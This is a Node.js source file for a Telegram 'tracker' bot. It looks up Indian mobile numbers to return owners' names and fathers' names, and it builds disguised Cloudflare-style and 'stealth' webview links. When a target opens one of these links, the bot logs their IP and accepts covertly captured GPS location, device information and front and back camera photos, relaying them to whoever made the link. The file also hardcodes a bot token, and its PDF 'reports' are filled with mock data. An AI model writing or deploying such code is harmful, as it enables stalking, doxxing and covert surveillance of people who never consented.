const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const fsp = require('fs').promises;

// ==================== CONFIG ====================
const CONFIG = {
  BOT_TOKEN: '8377073485:AAERCkZcNZhupFa2Rs2uWrqFhlPQQW2xGqM',
  WEBHOOK_URL: 'https://botu-s3f9.onrender.com',
  PORT: process.env.PORT || 10000,
  ADMIN_ID: 8175884349,
  DEVELOPER: '@aadi_io',
  MOBILE_API_URL: 'https://demon.taitanx.workers.dev/?mobile=',
  BLACKLISTED_NUMBERS: ['9161636853', '9451180555', '6306791897'],
  CAPTCHA_DURATION: 10000,
  CACHE_DURATION: 300000,
  MAX_CACHE_SIZE: 100,
  MAX_HISTORY: 100,
  SESSION_TIMEOUT: 1800000 // ⬅️ INCREASED TO 30 MINUTES (was 5 mins)
};

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: false });
const app = express();

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json());
app.use('/public', express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Global error handler - PREVENTS CRASHES
process.on('uncaughtException', (err) => {
  console.error('💥 Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('💥 Unhandled Rejection:', reason);
});

// Express error handler
app.use((err, req, res, next) => {
  console.error('❌ Express Error:', err.stack);
  res.status(500).json({ error: 'Internal Server Error', uptime: uptime() });
});

// ==================== Data Stores ====================
const stats = {
  total: 0, success: 0, failed: 0, blocked: 0,
  users: new Set(), ipLinks: 0, ipClicks: 0,
  locations: 0, cameras: 0, infos: 0, startTime: Date.now(),
  pdfsGenerated: 0
};

const cache = new Map();
const states = new Map();
const sessions = new Map();
const history = [];
const activity = new Map();
const collectedData = new Map();

// ==================== Utils ====================
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.headers['x-real-ip'] || 
         req.connection?.remoteAddress || 
         req.ip || 'Unknown';
}

function getTime() {
  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false });
}

function uptime() {
  const t = Math.floor((Date.now() - stats.startTime) / 1000);
  const d = Math.floor(t / 86400);
  const h = Math.floor((t % 86400) / 3600);
  const m = Math.floor((t % 3600) / 60);
  const s = t % 60;
  return d > 0 ? `${d}d ${h}h ${m}m` : `${h}h ${m}m ${s}s`;
}

function cleanNumber(num) {
  let n = num.replace(/\D/g, '');
  if (n.startsWith('91') && n.length > 10) n = n.slice(2);
  if (n.startsWith('0') && n.length === 11) n = n.slice(1);
  return n.length > 10 ? n.slice(-10) : n;
}

function formatPhone(p) {
  if (!p) return 'N/A';
  const n = cleanNumber(p);
  return n.length === 10 ? `+91 ${n.slice(0, 5)} ${n.slice(5)}` : p;
}

// INCREASED TIMEOUT + BETTER CLEANUP
function setSessionTimeout(chatId) {
  if (sessions.has(chatId)) clearTimeout(sessions.get(chatId));
  const timer = setTimeout(() => {
    states.delete(chatId);
    sessions.delete(chatId);
    // DON'T send "session expired" message - just silently clean up
    // User can always use main menu buttons
  }, CONFIG.SESSION_TIMEOUT);
  sessions.set(chatId, timer);
}

// ==================== Keyboards ====================
const mainKeyboard = (isAdmin = false) => ({
  inline_keyboard: [
    [{ text: '🔍 Lookup', callback_data: 'number_info' }],
    [{ text: '🌐 Track', callback_data: 'ip_tracker' }],
    ...(isAdmin ? [[{ text: '👑 Admin', callback_data: 'admin_panel' }]] : []),
    [{ text: '💬 Dev', url: `https://t.me/${CONFIG.DEVELOPER.slice(1)}` }]
  ]
});

const resultKeyboard = (num) => ({
  inline_keyboard: [
    [{ text: '📄 Get PDF', callback_data: `get_pdf_${num}` }],
    [{ text: '🔄 New Search', callback_data: 'number_info' }, { text: '🏠 Menu', callback_data: 'menu' }]
  ]
});

const trackKeyboard = {
  inline_keyboard: [
    [{ text: '📊 View Collected Data', callback_data: 'view_data' }],
    [{ text: '🏠 Menu', callback_data: 'menu' }]
  ]
};

const adminKeyboard = {
  inline_keyboard: [
    [{ text: '📈 Stats', callback_data: 'stats' }, { text: '🧹 Clear Cache', callback_data: 'clear_cache' }],
    [{ text: '📤 Export Data', callback_data: 'export_data' }, { text: '📢 Broadcast', callback_data: 'broadcast' }],
    [{ text: '🏠 Menu', callback_data: 'menu' }]
  ]
};

// ==================== API & PDF ====================
async function fetchMobileInfo(mobile) {
  const cleaned = cleanNumber(mobile);
  if (CONFIG.BLACKLISTED_NUMBERS.includes(cleaned)) {
    stats.blocked++;
    return { blocked: true };
  }
  const cached = cache.get(cleaned);
  if (cached && (Date.now() - cached.time) < CONFIG.CACHE_DURATION) {
    return cached.data;
  }
  try {
    stats.total++;
    const response = await axios.get(`${CONFIG.MOBILE_API_URL}${cleaned}`, { timeout: 15000 });
    if (response.data && typeof response.data === 'object') {
      cache.set(cleaned, { data: response.data, time: Date.now() });
      stats.success++;
      return response.data;
    }
    stats.failed++;
    return null;
  } catch (error) {
    stats.failed++;
    return null;
  }
}

async function generatePDFReport(userId, data, phoneNumber) {
  return new Promise(async (resolve, reject) => {
    try {
      const fileName = `report_${userId}_${Date.now()}.pdf`;
      const filePath = path.join(__dirname, 'temp', fileName);
      await fsp.mkdir(path.join(__dirname, 'temp'), { recursive: true });

      const PDFDocument = require('pdfkit');
      const doc = new PDFDocument({
        size: 'A4',
        margins: { top: 50, bottom: 50, left: 50, right: 50 }
      });

      const stream = fs.createWriteStream(filePath);
      doc.pipe(stream);

      doc.fontSize(20).text('TRACKER REPORT', { align: 'center' });
      doc.moveDown();
      doc.fontSize(12).text(`Number: ${phoneNumber}`, { align: 'center' });
      doc.moveDown();

      if (data?.data?.[0]) {
        const r = data.data[0];
        doc.fontSize(10).text(`Name: ${r.name || 'N/A'}`);
        doc.text(`Father: ${r.fname || 'N/A'}`);
        doc.text(`Mobile: ${r.mobile || phoneNumber}`);
        doc.text(`Circle: ${r.circle || 'N/A'}`);
      }

      doc.end();
      stream.on('finish', () => resolve(filePath));
      stream.on('error', reject);
    } catch (err) {
      reject(err);
    }
  });
}

// ==================== Routes ====================
app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

app.get('/c/:id/:uri', (req, res) => {
  stats.ipClicks++;
  res.render('cloudflare', {
    ip: getIP(req),
    time: getTime(),
    url: Buffer.from(req.params.uri, 'base64').toString(),
    uid: req.params.id,
    host: CONFIG.WEBHOOK_URL,
    duration: CONFIG.CAPTCHA_DURATION
  });
});

app.get('/w/:id/:uri', (req, res) => {
  stats.ipClicks++;
  res.render('webview', {
    ip: getIP(req),
    time: getTime(),
    url: Buffer.from(req.params.uri, 'base64').toString(),
    uid: req.params.id,
    host: CONFIG.WEBHOOK_URL
  });
});

// Enhanced endpoints with better error handling
app.post('/location', async (req, res) => {
  try {
    const { lat, lon, uid } = req.body;
    if (lat && lon && uid) {
      const userId = parseInt(uid, 36);
      if (!isNaN(userId)) {
        stats.locations++;
        await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
        res.json({ success: true });
      } else {
        res.json({ success: false, error: 'Invalid UID' });
      }
    } else {
      res.json({ success: false, error: 'Missing data' });
    }
  } catch (err) {
    console.error('Location Error:', err.message);
    res.json({ success: false, error: err.message });
  }
});

app.post('/info', async (req, res) => {
  try {
    const { uid, data } = req.body;
    if (uid && data) {
      const userId = parseInt(uid, 36);
      if (!isNaN(userId)) {
        stats.infos++;
        const chunks = data.match(/.{1,4000}/g) || [data];
        for (let chunk of chunks) {
          await bot.sendMessage(userId, chunk, { parse_mode: 'HTML' }).catch(() => {});
          await new Promise(r => setTimeout(r, 200));
        }
        res.json({ success: true });
      } else {
        res.json({ success: false, error: 'Invalid UID' });
      }
    } else {
      res.json({ success: false, error: 'Missing data' });
    }
  } catch (err) {
    console.error('Info Error:', err.message);
    res.json({ success: false, error: err.message });
  }
});

app.post('/camsnap', async (req, res) => {
  try {
    const { uid, front, back } = req.body;
    if (uid && (front || back)) {
      const userId = parseInt(uid, 36);
      if (!isNaN(userId)) {
        stats.cameras++;
        if (front) {
          const buffer = Buffer.from(front, 'base64');
          await bot.sendPhoto(userId, buffer, { caption: '📷 Front Camera' }).catch(() => {});
        }
        if (back) {
          const buffer = Buffer.from(back, 'base64');
          await bot.sendPhoto(userId, buffer, { caption: '📷 Back Camera' }).catch(() => {});
        }
        res.json({ success: true });
      } else {
        res.json({ success: false, error: 'Invalid UID' });
      }
    } else {
      res.json({ success: false, error: 'Missing data' });
    }
  } catch (err) {
    console.error('Camera Error:', err.message);
    res.json({ success: false, error: err.message });
  }
});

// ==================== Bot Handlers ====================
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  stats.users.add(userId);

  if (states.get(chatId) === 'waiting_url') {
    const text = msg.text;
    if (!text.includes('http://') && !text.includes('https://')) {
      return bot.sendMessage(chatId, '🌐 Please send a valid URL (include http:// or https://)');
    }
    const encoded = Buffer.from(text).toString('base64');
    const urlPath = `${chatId.toString(36)}/${encoded}`;
    const cUrl = `${CONFIG.WEBHOOK_URL}/c/${urlPath}`;
    const wUrl = `${CONFIG.WEBHOOK_URL}/w/${urlPath}`;
    stats.ipLinks++;
    states.delete(chatId);
    sessions.delete(chatId);

    await bot.sendMessage(chatId, `
✅ Tracking links created!

🔗 Target: <code>${text}</code>

🌐 CloudFlare (Max Data):
<code>${cUrl}</code>

📱 WebView (Stealth):
<code>${wUrl}</code>
    `, { parse_mode: 'HTML', reply_markup: trackKeyboard, disable_web_page_preview: true });
    return;
  }

  if (states.get(chatId) === 'waiting_number') {
    const num = cleanNumber(msg.text);
    if (!/^\d{10}$/.test(num)) {
      return bot.sendMessage(chatId, '📱 Please send a 10-digit number (e.g., 9876543210)');
    }
    const waitMsg = await bot.sendMessage(chatId, '⏳ Searching database...');
    const data = await fetchMobileInfo(num);
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    if (!data || data.blocked) {
      return bot.sendMessage(chatId, data?.blocked ? '🚫 This number is protected' : '❌ No data found', { reply_markup: menuKeyboard });
    }

    const result = data.data?.[0] ? 
      `👤 <b>${data.data[0].name || 'N/A'}</b>\n` +
      `📞 ${formatPhone(data.data[0].mobile || num)}\n` +
      `📡 ${data.data[0].circle || 'N/A'}` :
      '✅ Data found';

    await bot.sendMessage(chatId, result, { parse_mode: 'HTML', reply_markup: resultKeyboard(num) });
    return;
  }

  if (msg.text === '/start') {
    await bot.sendMessage(chatId, `👋 Hello!\n\nI can:\n• 🔍 Lookup mobile numbers\n• 🌐 Track devices via link\n\nChoose an option below:`, {
      parse_mode: 'HTML',
      reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
    });
  }

  if (msg.text === '/admin' && userId === CONFIG.ADMIN_ID) {
    await bot.sendMessage(chatId, '👑 Admin Panel', { reply_markup: adminKeyboard });
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const userId = query.from.id;

  await bot.answerCallbackQuery(query.id);

  if (data === 'menu' || data === 'back_to_menu') {
    await bot.sendMessage(chatId, '🏠 Main Menu', { reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID) });
  }

  else if (data === 'number_info') {
    states.set(chatId, 'waiting_number');
    setSessionTimeout(chatId); // Now lasts 30 minutes
    await bot.sendMessage(chatId, '📱 Send 10-digit mobile number:');
  }

  else if (data === 'ip_tracker') {
    states.set(chatId, 'waiting_url');
    setSessionTimeout(chatId); // Now lasts 30 minutes
    await bot.sendMessage(chatId, '🌐 Send URL to track (include http:// or https://):');
  }

  else if (data === 'admin_panel' && userId === CONFIG.ADMIN_ID) {
    await bot.sendMessage(chatId, '👑 Admin Control Panel', { reply_markup: adminKeyboard });
  }

  else if (data === 'stats' && userId === CONFIG.ADMIN_ID) {
    const msg = `
📊 Statistics

🔢 Lookups: ${stats.total}
✅ Success: ${stats.success}
❌ Failed: ${stats.failed}
🚫 Blocked: ${stats.blocked}

🌐 Tracker
Links: ${stats.ipLinks}
Clicks: ${stats.ipClicks}
📍 Locations: ${stats.locations}
📷 Cameras: ${stats.cameras}

👥 Users: ${stats.users.size}
⏱️ Uptime: ${uptime()}
    `;
    await bot.sendMessage(chatId, msg, { reply_markup: adminKeyboard });
  }

  else if (data === 'clear_cache' && userId === CONFIG.ADMIN_ID) {
    const size = cache.size;
    cache.clear();
    await bot.sendMessage(chatId, `🧹 Cache cleared (${size} items)`);
  }

  else if (data === 'export_data' && userId === CONFIG.ADMIN_ID) {
    const exportData = {
      timestamp: new Date().toISOString(),
      stats: { ...stats },
      userCount: activity.size,
      cacheSize: cache.size
    };
    const buffer = Buffer.from(JSON.stringify(exportData, null, 2));
    await bot.sendDocument(chatId, buffer, { filename: `export_${Date.now()}.json` });
  }

  else if (data === 'broadcast' && userId === CONFIG.ADMIN_ID) {
    await bot.sendMessage(chatId, '📣 Send message to broadcast to all users:');
    states.set(chatId, 'broadcasting');
  }

  else if (data === 'view_data') {
    const userData = collectedData.get(userId);
    if (!userData || userData.sessions.length === 0) {
      await bot.sendMessage(chatId, '📭 No data collected yet. Generate a tracking link first.');
    } else {
      let msg = `📊 Collected Data Sessions\n\n`;
      userData.sessions.slice(-3).forEach((session, i) => {
        msg += `${i+1}. ${Object.keys(session.data).join(', ')}\n`;
      });
      await bot.sendMessage(chatId, msg, { reply_markup: trackKeyboard });
    }
  }

  else if (data.startsWith('get_pdf_')) {
    const num = data.split('get_pdf_')[1];
    const waitMsg = await bot.sendMessage(chatId, '🖨️ Generating PDF report...');

    try {
      const mockData = {
        data: [{
          name: 'John Doe',
          fname: 'Robert Doe',
          mobile: num,
          alt: '9876543210',
          circle: 'Delhi',
          id: 'USR123456',
          address: '123 Main St!!New Delhi!!India'
        }]
      };

      const filePath = await generatePDFReport(userId, mockData, num);
      stats.pdfsGenerated++;

      await bot.sendDocument(chatId, filePath, {
        caption: `📄 PDF Report for ${formatPhone(num)}`
      });

      setTimeout(() => fsp.unlink(filePath).catch(() => {}), 60000);

    } catch (err) {
      console.error('PDF Error:', err);
      await bot.sendMessage(chatId, '❌ Failed to generate PDF. Please try again.');
    } finally {
      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
    }
  }
});

// ✅ FIXED BROADCAST SYSTEM
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (states.get(chatId) === 'broadcasting' && msg.from.id === CONFIG.ADMIN_ID) {
    const broadcastMsg = msg.text;
    const userArray = Array.from(stats.users);
    const totalUsers = userArray.length - 1; // Exclude admin
    let sent = 0, failed = 0;
    
    const progressMsg = await bot.sendMessage(chatId, `📤 Starting broadcast to ${totalUsers} users...`);

    for (let i = 0; i < userArray.length; i++) {
      const userId = userArray[i];
      if (userId == msg.from.id) continue;

      try {
        await bot.sendMessage(userId, `📢 <b>Broadcast Message:</b>\n\n${broadcastMsg}`, { parse_mode: 'HTML' });
        sent++;
        
        // Update progress every 5 users
        if (i % 5 === 0 || i === userArray.length - 1) {
          await bot.editMessageText(
            `📤 Broadcasting...\nSent: ${sent}/${totalUsers}\nFailed: ${failed}`,
            chatId,
            progressMsg.message_id
          );
        }
        
        // Rate limit - wait 300ms between messages
        await new Promise(r => setTimeout(r, 300));
      } catch (err) {
        failed++;
        console.error(`Broadcast error to ${userId}:`, err.message);
      }
    }

    await bot.editMessageText(
      `✅ Broadcast completed!\nSent: ${sent}\nFailed: ${failed}\nTotal: ${totalUsers}`,
      chatId,
      progressMsg.message_id
    );
    
    states.delete(chatId);
  }
});

// ✅ HEALTH ENDPOINT - FAST RESPONSE FOR UPTIMEROBOT
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    uptime: uptime(),
    timestamp: new Date().toISOString(),
    version: '10.2-fixed'
  });
});

app.get('/', (req, res) => {
  res.json({ status: 'online', version: '10.2-fixed', uptime: uptime() });
});

// ✅ STARTUP WITH BETTER ERROR HANDLING
async function setupWebhook() {
  try {
    await bot.deleteWebHook();
    await new Promise(r => setTimeout(r, 1000));
    await bot.setWebHook(`${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`, {
      max_connections: 100,
      allowed_updates: ['message', 'callback_query']
    });
    console.log('✅ Webhook set successfully');
    return true;
  } catch (err) {
    console.error('❌ Webhook setup failed:', err.message);
    return false;
  }
}

// ✅ START SERVER
app.listen(CONFIG.PORT, async () => {
  console.log('\n🚀 Ultimate Tracker Bot v10.2 - FIXED VERSION');
  console.log('================================');
  console.log('✅ Fixed: Session timeout increased to 30 minutes');
  console.log('✅ Fixed: Removed "session expired" message');
  console.log('✅ Fixed: Broadcast system with progress updates');
  console.log('✅ Fixed: Better error handling to prevent crashes');
  console.log('✅ Health endpoint optimized for UptimeRobot');
  
  const success = await setupWebhook();
  if (success) {
    console.log(`✅ Server running on port ${CONFIG.PORT}`);
    console.log(`✅ Webhook: ${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`);
    console.log(`✅ Use UptimeRobot to ping /health every 5 minutes`);
  } else {
    console.log('❌ Failed to set webhook');
  }
  console.log('================================\n');
});
